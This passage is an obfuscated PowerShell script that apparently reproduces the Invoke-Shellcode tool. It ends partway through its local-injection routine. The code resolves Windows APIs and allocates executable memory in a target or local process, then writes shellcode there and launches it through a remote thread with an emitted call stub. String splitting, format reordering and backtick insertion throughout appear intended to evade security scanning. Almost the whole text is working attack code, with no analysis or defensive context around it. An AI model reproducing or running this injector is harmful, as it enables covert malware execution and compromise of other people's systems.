 &('sE'+('T'+'-IT')+'Em') vaRIAbLe:4yoQ26 ( [TYPe]("{2}{0}{4}{1}{7}{3}{6}{5}"-f('N'+'.E'),'se',('S'+'Y'+("{0}{1}"-f 'ste','m')+("{3}{2}{1}{0}"-f 'ECtio','L','F','.RE')),'iL',('MIT'+'.as'),(("{0}{1}" -f'r','accEs')+'S'),'De',('M'+'bL'+'YBu'))  ) ;&(('Se'+'T-')+('VAR'+'iA')+('bl'+'E')) ("f"+('IX'+'U'))  ([TYPE]("{8}{5}{1}{6}{7}{0}{3}{2}{4}" -f'lL',('M.'+'r'),('tiO'+'N'),('in'+("{0}{1}" -f 'gcO','nve')+'n'),'s',('S'+'te'),('E'+'FlE'),('CTI'+("{0}{1}"-f'oN.','C')+'a'),'Sy') ); &('s'+('E'+("{1}{0}"-f 'T','T-i'))+'em')  (('V'+("{1}{0}"-f 'ria','a'))+('b'+'lE:')+'P'+('uz'+'6'))  ( [typE]("{0}{2}{1}{3}"-f('ApP'+'do'),'A','m','In')  );  &(('se'+'T-I')+('te'+'m')) VaRiabLE:m7a ( [TypE]("{1}{2}{3}{0}"-f'AY','s',('Ys'+'Te'+("{0}{1}" -f'M.','AR')),'r'));   &('S'+('et-'+'IT')+'EM') VaRIABle:9kra ([typE]("{0}{1}" -F'Bo','OL'))  ; &('s'+(("{0}{1}"-f 'e','t-it')+'e')+'M')  vARiAbLE:px4 (  [tYPe]("{0}{1}"-F 'In',('Tp'+'tr'))  );  &('S'+('eT'+'-')+('ITE'+'m'))  VAriabLE:V05 ([Type]("{1}{0}" -F'32',('U'+'iNT')) ) ;    $Wi8= [TypE]("{4}{1}{0}{5}{9}{3}{8}{7}{2}{6}" -F('E'+'.I'),'m','a',('OP'+'S'),(("{0}{1}"-f'sy','sTem.')+'rUn'+'TI'),('N'+'Te'),('rs'+'hal'),('S'+'.m'),('e'+("{1}{0}"-f 'ViCe','R')),'r')  ;function Invoke-Shellcode
{


[CmdletBinding( DefaultParameterSetName = {{'Ru'+'n'}+"L`O"+('c'+'al')}, SupportsShouldProcess = ${Tr`UE} , ConfirmImpact = "hi`gh")] Param (
    [ValidateNotNullOrEmpty()]
    [UInt16]
    ${PrOCEs`S`ID},
    
    [Parameter( ParameterSetName = "r`UnlO`cAL" )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    ${SHE`LL`CODe},
    
    [Switch]
    ${FOr`ce} = ${f`AL`sE}
)

    &("{2}{1}{3}{0}" -f'de',("{0}{1}"-f'S',('tri'+'ctM')),("{1}{0}"-f ('et'+'-'),'S'),'o') -Version 2.0

    if ( ${pS`BOUND`P`AraMEtErS}[(('Pr'+'o')+'c'+("{0}{1}" -f'e',('ssI'+'D')))] )
    {
        
        
        &("{1}{2}{0}{3}"-f 's',('G'+'et'),("{1}{0}" -f ('roc'+'e'),'-P'),'s') -Id ${Pro`cE`sSid} -ErrorAction Stop | &("{2}{1}{0}" -f('ul'+'l'),'-N',('Ou'+'t'))
    }
    
    function Local:Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            ${Par`Am`E`TERs} = (&("{0}{1}{2}"-f'N',("{1}{0}"-f ('Ob'+'j'),('e'+'w-')),('e'+'ct')) Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            ${reTur`NTY`PE} = [Void]
        )

        ${DOM`AiN} =   (  &('LS') (('VA'+'r')+'IA'+('b'+'le')+(("{0}{1}" -f ':','puZ')+'6'))).vALuE::CurrentDomain
        ${dYn`Ass`emBly} = &("{1}{2}{0}"-f ("{0}{1}{2}" -f 'w-',('O'+'bj'),('e'+'ct')),'N','e') System.Reflection.AssemblyName((("{0}{1}"-f('R'+'efl'),'ec')+'t'+("{0}{1}"-f 'e',('dD'+'el'))+("{0}{1}" -f ('eg'+'a'),'te')))
        ${As`S`eMb`lyBuiL`Der} = ${Do`Ma`IN}.DefineDynamicAssembly(${dyn`ASse`mBlY},   (&(('Get'+'-V')+('A'+'rI')+('a'+'BLe'))  4yOQ26 -vAlUEOnlY )::Run)
        ${Mo`DU`lebui`LdeR} = ${aSSE`MbLy`BuiL`DEr}.DefineDynamicModule((("{1}{0}"-f 'e',('I'+'nM'))+("{0}{1}"-f ('mo'+'r'),'y')+("{1}{0}"-f ('odu'+'l'),'M')+'e'), ${Fa`lSE})
        ${T`Y`pe`BUIlDER} = ${MODu`LeBU`iLd`er}.DefineType(('My'+("{0}{1}"-f 'De','le')+("{0}{1}"-f ('gat'+'eT'),('y'+'pe'))), ('Cl'+("{1}{0}{2}"-f ',',('as'+'s'),(' P'+'ubl'))+("{1}{0}"-f', ','ic')+'S'+'e'+'a'+("{1}{0}" -f 'n',('le'+'d,'+' A'))+("{2}{1}{0}"-f'as','l',('si'+'C'))+("{0}{1}"-f's',(','+' A'))+("{1}{0}" -f ('as'+'s'),(("{0}{1}" -f 'u','toC')+'l'))), [System.MulticastDelegate])
        ${COn`StR`Uc`TOrBuIL`Der} = ${typE`BUil`D`ER}.DefineConstructor(('RT'+("{0}{1}"-f ('S'+'pec'),'i')+("{1}{0}" -f 'a',('al'+'N'))+("{2}{0}{1}"-f'e',(','+' Hi'),'m')+'d'+("{2}{0}{1}" -f('yS'+'ig,'),(' '+'Pu'),'eB')+'b'+('l'+'ic')),   (  &(('VA'+'RI')+'A'+('B'+'LE'))  ("f"+('Ix'+'u'))  ).VAlUE::Standard, ${Pa`RaMet`ErS})
        ${ConsT`RUctoRb`U`ILder}.SetImplementationFlags(('Ru'+("{0}{1}"-f 'nt','im')+("{1}{0}" -f (','+' Ma'),'e')+('na'+'g')+'ed'))
        ${meT`HODBU`Ilder} = ${T`Y`pE`BUildeR}.DefineMethod('Invoke', (("{0}{1}" -f ('Pu'+'bl'),'i')+'c,'+("{1}{0}{2}"-f 'Hi',' ',('d'+'eBy'))+("{1}{0}"-f' N',('Si'+'g,'))+("{1}{0}" -f'l',('ew'+'S'))+'o'+'t'+("{1}{0}" -f ('i'+'rt'),(', '+'V'))+('ua'+'l')), ${returNT`Y`PE}, ${pa`RAMe`Te`RS})
        ${me`Tho`DbU`ildER}.SetImplementationFlags((("{2}{0}{1}" -f 'n',(("{0}{1}" -f 'time',',')+' '),'Ru')+'M'+'an'+'ag'+'ed'))
        
        &("{3}{2}{0}{1}"-f ('t'+'pu'),'t',("{0}{1}"-f ('te'+'-O'),'u'),('W'+'ri')) ${typEB`U`iLd`er}.CreateType()
    }

    function Local:Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]
        
            [Parameter( Position = 0, Mandatory = ${tR`UE} )]
            [String]
            ${Mo`D`UlE},
            
            [Parameter( Position = 1, Mandatory = ${T`RuE} )]
            [String]
            ${ProCE`d`URE}
        )

        
        ${Sy`STeM`Ass`eMb`Ly} =   (  &(('Va'+'RI')+('AB'+'l')+'E')  (('PU'+'z')+'6')  -VaLu)::CurrentDomain.GetAssemblies() |
            &("{1}{3}{0}{2}" -f("{1}{0}" -f('Obj'+'e'),'-'),("{0}{1}" -f 'Wh','er'),'ct','e') { ${_}.GlobalAssemblyCache -And ${_}.Location.Split((('6J'+'86'+'J8').REpLAcE(([chAr]54+[chAr]74+[chAr]56),[StRing][chAr]92)))[-1].Equals(('Sy'+('s'+'te')+("{1}{0}"-f'l',('m.'+'dl')))) }
        ${UN`S`A`FEnatiVemEth`odS} = ${sYsTeM`AS`S`eMBLy}.GetType(('M'+('i'+'cr')+("{1}{0}"-f('so'+'f'),'o')+("{1}{0}"-f ('.'+'Wi'),'t')+("{2}{4}{3}{1}{0}" -f ('ti'+'v'),'a',('n'+'32'),('a'+'feN'),('.'+'Uns'))+('e'+'Me')+'t'+("{1}{0}" -f 's',('ho'+'d'))))
        
        ${Get`MOd`ULehAn`D`lE} = ${U`NS`Af`eNatiV`EM`EthodS}.GetMethod((("{2}{0}{1}" -f'ul',('eH'+'a'),('Ge'+("{1}{0}"-f'od','tM')))+'n'+('d'+'le')))
        ${G`EtpR`ocA`ddRE`SS} = ${Unsa`FEn`ATI`VeMEt`Ho`DS}.GetMethod((("{1}{0}" -f 'r',('G'+'etP'))+("{0}{1}" -f ('o'+'cA'),'dd')+'r'+('e'+'ss')))
        
        ${keRn`3`2`HAnDLe} = ${Getm`OD`UlE`handLE}.Invoke(${n`ULl}, @(${MoDu`LE}))
        ${T`MP`PTR} = &("{1}{2}{3}{0}"-f("{1}{0}"-f't',('j'+'ec')),'Ne','w',('-O'+'b')) IntPtr
        ${hA`NdL`e`Ref} = &("{1}{2}{0}"-f 't',("{0}{1}" -f'Ne',('w-O'+'b')),('je'+'c')) System.Runtime.InteropServices.HandleRef(${t`mPPTR}, ${K`eRn32`HAnD`Le})
        
        
        &("{1}{2}{0}" -f 'ut','W',("{1}{0}{2}" -f('e'+'-O'),('r'+'it'),('ut'+'p'))) ${GeTpr`OCadDrE`ss}.Invoke(${Nu`Ll}, @([System.Runtime.InteropServices.HandleRef]${HaN`d`lerEF}, ${p`RoCe`d`UrE}))
    }

    
    function Local:Emit-CallThreadStub ([IntPtr] ${b`A`sEaddr}, [IntPtr] ${eX`IT`Th`ReaDAddr}, [Int] ${a`R`CH`I`TEcTuRE})
    {
        ${I`NtSIZ`EpTR} = ${aRCH`ITeCt`URE} / 8

        function Local:ConvertTo-LittleEndian ([IntPtr] ${aDD`R`esS})
        {
            ${Li`TT`leENDI`A`Nb`yTEarR`AY} = &("{2}{1}{3}{0}"-f 'ct','j',("{1}{0}" -f 'b',('Ne'+'w-O')),'e') Byte[](0)
            ${aDDr`ess}.ToString("X$($IntSizePtr*2)") -split '([A-F0-9]{2})' | &("{3}{0}{2}{1}" -f ("{1}{0}" -f'j',('a'+("{0}{1}"-f 'ch-','Ob'))),'t','ec',("{1}{0}" -f'rE','Fo')) { if (${_}) { ${LItTle`EnD`i`AnBytE`ArR`AY} += [Byte] ('0x{0}' -f ${_}) } }
             (&('IT'+'EM')  VArIAbLe:m7A).vAlUE::Reverse(${liTtl`e`eN`d`IA`NByTEarray})
            
            &("{1}{0}{2}" -f'it','Wr',("{1}{0}" -f 't',(("{1}{0}" -f'utp','e-O')+'u'))) ${liTtlEEndIaNb`y`Tea`RRAy}
        }
        
        ${CaL`LsT`Ub} = &("{2}{1}{0}"-f("{1}{0}{2}" -f'c',('-Ob'+'je'),'t'),'w','Ne') Byte[](0)
        
        if (${i`N`TsizEptR} -eq 8)
        {
            [Byte[]] ${cAlL`S`TUB} = 0x48,0xB8                      
            ${ca`lLstuB} += &("{0}{2}{3}{1}" -f ("{0}{2}{1}" -f(("{0}{1}" -f'C','onv')+'e'),'t','r'),("{0}{1}" -f('End'+'i'),'an'),'T',("{1}{2}{0}" -f'e',('o-'+'Lit'),'tl')) ${bas`E`A`dDr}       
            ${cAlL`St`Ub} += 0xFF,0xD0                              
            ${CA`Ll`St`Ub} += 0x6A,0x00                              
            ${c`ALlsTuB} += 0x48,0xB8                              
            ${c`ALlsT`UB} += &("{0}{1}{2}{4}{3}"-f ("{1}{0}"-f 'v',('Co'+'n')),'e',("{1}{0}" -f ('tT'+'o-'),'r'),("{1}{0}"-f 'n',('di'+'a')),("{0}{1}"-f ('L'+'itt'+'le'),'En')) ${e`xitthREaD`A`dDr} 
            ${C`Allst`UB} += 0xFF,0xD0                              
        }
        else
        {
            [Byte[]] ${c`AllS`TUB} = 0xB8                           
            ${C`A`Llstub} += &("{1}{5}{3}{4}{2}{0}" -f("{0}{1}" -f'd',('ia'+'n')),('Co'+'n'),'En',("{0}{1}" -f('o-'+'L'),'it'),('t'+'le'),("{1}{0}" -f('e'+'rtT'),'v')) ${ba`S`EadDr}       
            ${c`ALlS`TuB} += 0xFF,0xD0                              
            ${Cal`LS`TUb} += 0x6A,0x00                              
            ${cALl`sT`Ub} += 0xB8                                   
            ${C`ALlstuB} += &("{2}{1}{0}{3}{5}{4}"-f("{1}{0}{2}"-f('tT'+'o-L'),'er','i'),('on'+'v'),'C','t','n',("{0}{1}{2}" -f'tl',('eE'+'nd'),'ia')) ${ex`it`ThReaD`ADDR} 
            ${c`A`LlsTUb} += 0xFF,0xD0                              
        }
        
        &("{3}{2}{0}{1}" -f 'ut',('p'+'ut'),'-O',("{1}{0}"-f'te',('Wr'+'i'))) ${cal`Lst`Ub}
    }

    function Local:Inject-RemoteShellcode ([Int] ${P`RoCes`sid})
    {
        
        ${hp`R`oCESS} = ${o`peN`ProCess}.Invoke(0x001F0FFF, ${f`A`Lse}, ${pR`o`CEssId}) 
        
        if (!${hP`R`O`ceSS})
        {
            Throw (('U'+'na')+("{1}{0}"-f'e ','bl')+'t'+'o '+'op'+('e'+'n ')+'a '+("{0}{1}"-f('p'+'ro'),'c')+("{0}{1}" -f ('es'+'s'),' ')+('h'+'an')+('dl'+'e')+' '+('f'+'or')+' '+('PI'+'D')+': '+"$ProcessID")
        }

        ${iS`w`ow64} = ${FA`l`SE}

        if (${6`4Bit`oS}) 
        {
            
            ${IswO`w`64`pRoCesS}.Invoke(${hPR`oCE`SS}, [Ref] ${Is`Wow64}) | &("{0}{1}{2}"-f'Ou','t-',("{0}{1}" -f 'Nu','ll'))
            
            if ((!${IsW`O`W64}) -and ${p`oW`ERsh`eLL32B`iT})
            {
                Throw ('Sh'+("{1}{0}" -f('ll'+'co'),'e')+("{1}{0}{2}"-f 'ec',('de'+' '+'inj'),'ti')+'on'+(' '+'ta')+'rg'+'e'+'ti'+'ng'+' a'+("{1}{0}" -f ('4'+'-bi'),' 6')+("{0}{2}{1}" -f 't ','ss',(("{1}{0}"-f'roc','p')+'e'))+("{2}{1}{0}"-f('om'+' '),'r',' f')+'3'+("{1}{0}{2}" -f('it'+' '+'Pow'),('2'+'-b'),('e'+'rS'))+("{1}{4}{2}{0}{3}"-f ' s',(("{0}{1}" -f'he','ll')+' '+'is'),'t','u',(' n'+'o'))+("{0}{1}"-f('p'+'po'),'r')+('te'+'d')+'. '+("{0}{1}"-f ('Use'+' '),'t')+("{0}{1}"-f'he',' 6')+("{0}{1}" -f'4-','bi')+("{1}{0}" -f('er'+'s'),('t'+' v'))+'io'+("{0}{2}{1}" -f'n','r',(' '+'o'+("{0}{1}{2}" -f'f P','ow','e')))+("{0}{1}" -f ('sh'+'e'),'l')+("{1}{2}{0}"-f ('f'+' yo'),'l ','i')+("{1}{0}"-f 'an',('u '+'w'))+("{1}{0}"-f(' '+'th'),'t')+'i'+("{1}{2}{0}"-f('rk'+'.'),(("{1}{0}"-f ' ','s to')+'w'),'o'))
            }
            elseif (${ISW`O`W64}) 
            {
                if (${S`HelL`COdE`32}.Length -eq 0)
                {
                    Throw ('No'+' '+'sh'+('el'+'l')+("{0}{1}" -f 'c',('o'+'de '))+'wa'+'s '+('p'+'la')+("{0}{1}"-f'c',('ed'+' '))+'in'+' '+'th'+'e '+(('EO'+'oS'+("{1}{0}" -f ('lc'+'od'),('he'+'l'))+("{0}{1}"-f ('e3'+'2'),' ')) -rEPLace ([CHaR]69+[CHaR]79+[CHaR]111),[CHaR]36)+'va'+("{1}{0}" -f'l',('ria'+'b'))+'e!')
                }
                
                ${S`H`ELL`cOde} = ${ShEl`LcOd`E`32}
                &("{3}{2}{1}{0}" -f 'se','bo',("{0}{1}"-f'it',('e-'+'Ver')),'Wr') (("{0}{1}" -f'I',('nj'+'e'))+("{1}{0}"-f'in','ct')+("{0}{2}{1}" -f (("{1}{0}"-f 't','g in')+'o '),'W','a ')+("{1}{0}"-f'4',('ow'+'6'))+' '+("{1}{0}"-f ('ce'+'ss'),('p'+'ro'))+'.')
                &("{4}{0}{3}{1}{2}"-f 'ri',("{0}{1}"-f ('rb'+'o'),'s'),'e',("{0}{1}" -f'te',('-'+'Ve')),'W') ('Us'+("{2}{3}{1}{0}"-f (("{0}{1}" -f' 32','-bit')+' '),'g','i','n')+'sh'+("{1}{0}"-f('lc'+'o'),'el')+'de'+'.')
            }
            else 
            {
                if (${S`HELlco`d`E64}.Length -eq 0)
                {
                    Throw ('No'+' '+'sh'+('el'+'l')+("{0}{1}" -f('co'+'d'),'e ')+'w'+('as'+' ')+'p'+("{1}{0}"-f'e',('la'+'c'))+'d '+'i'+'n '+('th'+'e')+' '+(('g'+'fE')+("{0}{1}"-f('Sh'+'e'),'l')+("{1}{0}" -f ('co'+'d'),'l')+('e6'+'4')+' ').REpLaCe(([CHaR]103+[CHaR]102+[CHaR]69),[STRiNG][CHaR]36)+'v'+("{0}{1}" -f'a',(("{1}{0}" -f'b','ria')+'l'))+'e!')
                }
                
                ${She`ll`c`ODE} = ${she`ll`c`oDE64}
                &("{1}{3}{0}{2}"-f ("{0}{1}{2}"-f't','e',('-'+'Ver'+'bo')),'W','se','ri') (("{1}{0}" -f ' 6',('Us'+'ing'))+("{2}{1}{0}"-f's',(("{0}{1}" -f'-','bit')+' '),'4')+'he'+("{0}{1}" -f 'll',('co'+'de.')))
            }
        }
        else 
        {
            if (${SHE`lLcODe`32}.Length -eq 0)
            {
                Throw ('N'+'o '+'sh'+("{1}{0}" -f('l'+("{1}{0}"-f'd','lco')),'e')+'e '+'w'+('as'+' ')+'p'+("{1}{2}{0}" -f ' ',('l'+'ac'),'ed')+'i'+'n '+('t'+'he')+' '+('g'+('3'+'QS')+('he'+'l')+("{0}{1}" -f ('lc'+'o'),('d'+("{1}{0}"-f '32 ','e')))).rEPlACe(([ChAr]103+[ChAr]51+[ChAr]81),'$')+("{0}{1}"-f ('va'+'ri'),'a')+'bl'+'e!')
            }
            
            ${s`Hel`lc`ode} = ${S`hELL`Code32}
            &("{0}{2}{4}{1}{3}" -f'Wr','s',("{2}{1}{0}"-f('e'+'rb'),'V',('ite'+'-')),'e','o') (("{1}{0}"-f ('si'+'n'),'U')+("{1}{0}"-f('32'+'-'),'g ')+('b'+'it')+("{0}{1}" -f ' ',('sh'+'e'))+'ll'+'co'+('de'+'.'))
        }

        
        ${r`eMOtEMe`m`AddR} = ${V`IrTUaLaLl`o`cex}.Invoke(${Hpr`OcE`sS},  ( &('v'+('ar'+("{1}{0}" -f 'l','IAB')+'e'))  ('P'+'x4') ).VALUE::Zero, ${s`HeLLco`dE}.Length + 1, 0x3000, 0x40) 
        
        if (!${RemO`T`EmeMaDDr})
        {
            Throw ('Un'+("{0}{1}" -f 'a',('bl'+'e'))+' '+'to'+' '+'a'+('l'+'lo')+("{0}{1}" -f'c',('ate'+' '))+'s'+("{0}{1}" -f 'h',('el'+'l'))+("{1}{0}" -f'e',('c'+'od'))+' '+("{1}{0}"-f ('m'+'or'),'me')+'y'+' '+'i'+'n '+("{0}{1}" -f ('P'+'ID'),':')+' '+"$ProcessID")
        }
        
        &("{2}{1}{0}{3}"-f ("{1}{0}"-f 'rb','Ve'),'e-',("{1}{0}"-f't',('W'+'ri')),('os'+'e')) "Shellcode memory reserved at 0x$($RemoteMemAddr.ToString("X$([IntPtr]::Size*2)"))    "

        
        ${WR`ITe`PROcEss`meMoRY}.Invoke(${hprO`C`ESs}, ${REmOte`MeM`A`DDr}, ${sh`EL`LC`oDE}, ${s`heL`LCo`De}.Length, [Ref] 0) | &("{1}{2}{0}"-f 'l',("{1}{0}" -f 'N',('O'+'ut-')),'ul')

        
        ${eXItt`HRE`ADADDr} = &("{1}{2}{3}{0}"-f ("{1}{0}" -f 'ss',('d'+'re')),("{1}{0}"-f '-P',('G'+'et')),("{0}{1}" -f 'r',('oc'+'A')),'d') kernel32.dll ExitThread

        if (${iSw`o`w64})
        {
            
            ${Ca`lLS`Tub} = &("{0}{2}{1}{3}" -f ("{2}{0}{1}" -f('mi'+'t-'),'Ca','E'),'e',("{1}{0}"-f('T'+'hr'),'ll'),("{0}{1}"-f('a'+'dS'),('t'+'ub'))) ${rE`mO`Te`meMaddr} ${EXi`T`THREA`dA`dDR} 32
            
            &("{2}{0}{4}{3}{1}"-f 'r','e',("{0}{1}{2}" -f'W','ri',('te'+'-Ve')),'s','bo') ('Em'+'i'+'t'+("{0}{1}" -f'ti',('ng'+' '))+'3'+('2-'+'b')+("{0}{1}" -f (("{0}{1}" -f'it ','a')+'s'),'s')+("{1}{0}" -f'a',(("{0}{1}" -f'em','bl')+'y c'))+("{0}{1}" -f'll',(' st'+'u'))+'b.')
        }
        else
        {
            
            ${cAll`S`TuB} = &("{5}{4}{2}{3}{1}{0}" -f("{2}{1}{0}"-f('dS'+'tub'),'a','re'),'h',("{0}{1}" -f ('-'+'Cal'),'l'),'T',('mi'+'t'),'E') ${Re`moTeme`Ma`dDR} ${E`x`it`ThReadaDDR} 64
            
            &("{1}{0}{3}{2}" -f ('i'+'te'),'Wr',("{0}{1}" -f'rb',('os'+'e')),('-V'+'e')) ('E'+'m'+'i'+'t'+("{1}{0}{2}"-f ' ',('tin'+'g'),('64'+'-'))+("{0}{1}" -f 'bi',('t'+' a'))+("{0}{1}"-f('s'+'se'),'mb')+'l'+("{1}{0}{2}{3}"-f ('l'+' s'),(("{1}{0}"-f'ca','y ')+'l'),'tu','b.'))
        }

        
        ${rE`M`OTEsTUBad`Dr} = ${VIR`TuALA`l`loCEX}.Invoke(${HprO`Ce`sS},  (&((("{1}{0}" -f'ArI','V')+'A'+'BL')+'E')  PX4).valuE::Zero, ${C`AlL`StuB}.Length, 0x3000, 0x40) 
        
        if (!${rEm`Ot`eS`TUBA`Ddr})
        {
            Throw (("{0}{1}"-f 'U',('nab'+'l'))+'e '+'to'+' '+'a'+("{1}{0}" -f'oc','ll')+("{0}{1}"-f 'at','e ')+'t'+'hr'+("{1}{0}" -f('a'+'d '),'e')+('ca'+'l')+'l '+'s'+("{1}{0}"-f ' ',('t'+'ub'))+("{0}{1}" -f 'me','mo')+('r'+'y ')+'i'+'n '+("{1}{0}"-f':',('PI'+'D'))+' '+"$ProcessID")
        }
        
        &("{1}{0}{2}"-f ("{1}{0}" -f('Ve'+'r'),'e-'),("{1}{0}"-f't',('Wr'+'i')),("{1}{0}"-f 'se','bo')) "Thread call stub memory reserved at 0x$($RemoteStubAddr.ToString("X$([IntPtr]::Size*2)"))    "

        
        ${WriteP`RoC`e`SSm`em`ORY}.Invoke(${h`Pr`OceSs}, ${r`EmoT`eSTu`BadDr}, ${C`AllsTub}, ${CaLl`ST`Ub}.Length, [Ref] 0) | &("{1}{0}{2}"-f("{1}{0}"-f'l',('t-'+'Nu')),'Ou','l')

        
        ${thR`EaDhA`N`D`Le} = ${creATE`REm`OtE`THre`AD}.Invoke(${Hpr`OCE`ss},  $PX4::Zero, 0, ${rE`MOTEs`Tu`BADDr}, ${rEMO`TeM`e`m`AddR}, 0,   (&(('Ge'+'T-I'+'T')+'E'+'M')  ("V"+(("{0}{1}"-f'AR','iAb')+'le')+":"+('p'+'X4')) ).VAlue::Zero)
        
        if (!${tHREAdh`A`NdLE})
        {
            Throw (('Un'+'a')+'bl'+'e '+'to'+' '+'l'+("{1}{0}" -f ('n'+'ch'),'au')+' '+("{1}{0}" -f 'ot',('re'+'m'))+'e '+("{0}{1}"-f (("{1}{0}"-f 'e','thr')+'a'),'d')+' '+'i'+'n '+('P'+'ID')+': '+"$ProcessID")
        }

        
        ${C`lOs`eHaND`le}.Invoke(${H`Pr`O`ceSs}) | &("{0}{1}{2}" -f('O'+'ut'),("{0}{1}"-f ('-N'+'u'),'l'),'l')

        &("{2}{1}{0}{3}"-f("{0}{1}" -f('er'+'b'),'os'),("{0}{1}"-f't',('e'+'-V')),('Wr'+'i'),'e') (("{0}{1}{2}"-f ('She'+'l'),('lco'+'de'),' ')+('in'+'j')+'ec'+'ti'+'on'+("{1}{0}" -f 'om',' c')+("{0}{1}"-f'p',('le'+'t'))+'e!')
    }

    function Local:Inject-LocalShellcode
    {
        if (${pOW`erSHe`LL3`2`B`iT}) {
            if (${shELl`co`De`32}.Length -eq 0)
            {
                Throw ('N'+'o '+("{1}{0}"-f('e'+'ll'),'sh')+'co'+('de'+' ')+('w'+'as')+' '+('pl'+'a')+("{0}{1}" -f'ce','d ')+'i'+'n '+('th'+'e')+' '+('{0}'+("{2}{1}{0}" -f('d'+'e3'),('l'+'co'),('She'+'l'))+'2 ')  -F[ChAR]36+'v'+('ar'+'i')+'ab'+('l'+'e!'))
                return
            }
            
            ${s`HeLl`C`oDe} = ${s`HeLl`CODE`32}
            &("{3}{4}{0}{2}{1}"-f'-V',("{0}{1}"-f('r'+'bos'),'e'),'e',('Wr'+'i'),'te') (("{1}{2}{0}" -f ('ng '+'32'+'-bi'),'U','si')+("{1}{0}" -f (' '+("{0}{1}"-f'she','l')),'t')+("{1}{0}"-f'de',('lc'+'o'))+'.')
        }
        else
        {
            if (${s`hE`LL`code64}.Length -eq 0)
            {
                Throw ('No'+' '+'s'+'he'+('ll'+'c')+("{0}{1}"-f 'o',('de'+' '))+'wa'+'s '+'p'+('l'+'ac')+('e'+'d ')+'i'+'n '+'th'+'e '+((("{1}{0}"-f('Y'+'oSh'),'G')+("{0}{1}" -f 'e',('ll'+'c'))+'o'+'d'+("{1}{0}"-f' ',('e6'+'4')))-REPLaCE ('GY'+'o'),[char]36)+("{0}{1}" -f ('v'+'ari'),'a')+'b'+('l'+'e!'))
                return
            }
            
            ${sheL`L`c`odE} = ${SheLl`C`ODe`64}
            &("{2}{3}{1}{0}" -f 'e',('b'+'os'),('Wr'+'i'),("{0}{1}{2}"-f('te-'+'V'),'e','r')) ('U'+("{1}{0}"-f ('n'+'g '),'si')+("{2}{1}{0}"-f ' ',('bi'+'t'),('64'+'-'))+("{1}{0}" -f 'll',('sh'+'e'))+("{1}{0}" -f'.',('cod'+'e')))
        }
    
        
        ${bASea`DDR`Ess} = ${ViRTUA`L`AlLOc}.Invoke( (  &('v'+('A'+("{1}{0}" -f'BL','Ria'))+'E')  ('p'+'X4')).VAluE::Zero, ${SHELlC`o`dE}.Length + 1, 0x3000, 0x40) 
        if (!${B`AsEaDDr`E`SS})
        {
            Throw ('Un'+("{1}{0}"-f' ',('a'+'ble'))+'t'+'o '+('al'+'l')+'o'+("{0}{1}"-f('ca'+'t'),'e ')+'s'+("{2}{0}{1}" -f ('l'+'lco'),'de','he')+' '+'m'+("{1}{0}" -f 'r',('e'+'mo'))+'y '+'in'+' '+('P'+'ID')+': '+"$ProcessID")
        }
        
        &("{2}{1}{0}{3}"-f 'o',('er'+'b'),("{1}{2}{0}"-f ('e'+'-V'),'W',('r'+'it')),'se') "Shellcode memory reserved at 0x$($BaseAddress.ToString("X$([IntPtr]::Size*2)"))    "

        
         (&('GI')  ('va'+(("{0}{1}" -f'riA','B')+'l'+'e:')+('W'+'I8'))).ValuE::Copy(${s`hEl`lcO`de}, 0, ${bAS`Ea`d`drEsS}, ${SheLLc`O`de}.Length)
        
        
        ${exItthR`EAd`A`dDr} = &("{4}{0}{3}{2}{1}" -f('t'+'-P'),'s',("{0}{1}"-f('oc'+'A'),('d'+("{1}{0}" -f'es','dr'))),'r','Ge') kernel32.dll ExitThread
        
        if (${pOwE`RsHel`L`32`BIt})
        {
            ${cA`Ll`STUB} = &("{0}{3}{1}{2}"-f 'E','lT',("{1}{0}"-f ('d'+("{1}{0}" -f'ub','St')),('h'+'rea')),("{0}{1}{2}" -f'mi',('t-'+'C'),'al')) ${BaSE`A`DdREsS} ${E`x`it`ThRe`AdadDr} 32
            
            &("{0}{2}{1}" -f('W'+'ri'),("{2}{1}{0}" -f 'e',('bo'+'s'),'er'),("{0}{1}" -f('te'+'-'),'V')) (("{1}{0}" -f'it','Em')+('t'+'in')+'g '+("{0}{1}" -f'3',('2-b'+'it'))+(' '+'as')+'se'+'m'+("{0}{1}" -f ('b'+'ly'),(' '+("{0}{1}" -f 'cal','l')))+("{0}{1}"-f' ',('s'+'tu'))+'b.')
        }
        else
        {
            ${c`ALLs`TUB} = &("{3}{4}{1}{0}{2}"-f'e','hr',("{2}{0}{1}" -f'St','ub','ad'),("{0}{1}" -f('Em'+'i'),('t-C'+'a')),('ll'+'T')) ${baS`EAD`dr`Ess} ${ExIT`THr`ead`A`ddr} 64
            
            &("{3}{1}{0}{2}{4}"-f 'bo',('Ve'+'r'),'s',("{1}{2}{0}"-f('i'+'te-'),'W','r'),'e') (('Em'+'i')+("{0}{1}"-f ('t'+("{1}{0}" -f'ing','t')),(' '+'64'))+("{0}{1}" -f ('-b'+'i'),'t')+("{2}{0}{1}"-f 'a',('sse'+'m'),' ')+('bl'+'y')+("{0}{1}{2}"-f(' c'+'al'+'l '),'st','u')+'b.')
        }

        
        ${cAllS`Tu`BADDRE`Ss} = ${VI`RT`Ua`lALlOc}.Invoke( (  &(('VA'+'Ri')+('AB'+'l')+'E') ("P"+'X4') ).VALuE::Zero, ${cal`lst`UB}.Length + 1, 0x3000, 0x40) 
        if (!${c`ALL`st`U`BA`dDrEsS})
        {
            Throw ('Un'+('a'+'bl')+("{0}{1}" -f('e '+'to '),'a')+("{1}{0}"-f('l'+'oc'),'l')+'a'+'t'+("{0}{1}"-f 'e',(' t'+'h'))+'r'+'ea'+("{1}{0}" -f'l',('d c'+'a'))+("{2}{0}{1}"-f(' s'+'tub'),'.','l'))
        }
        
        &("{2}{0}{1}"-f'-',("{1}{2}{0}"-f('bo'+'se'),'Ve','r'),("{0}{1}" -f('W'+'rit'),'e')) "Thread call stub memory reserved at 0x$($CallStubAddress.ToString("X$([IntPtr]::Size*2)"))    "

        
          (  &('c'+('H'+("{2}{0}{1}"-f'di','TE','iL'))+'m')  (('VA'+'R')+(("{0}{1}"-f 'Ia','Bl')+'E')+(':W'+'I')+"8")  ).vaLUE::Copy(${cALL`s`TUb}, 0, ${CA`llsTUbad`dr`E`sS}, ${cAl`Ls`Tub}.Length)

        
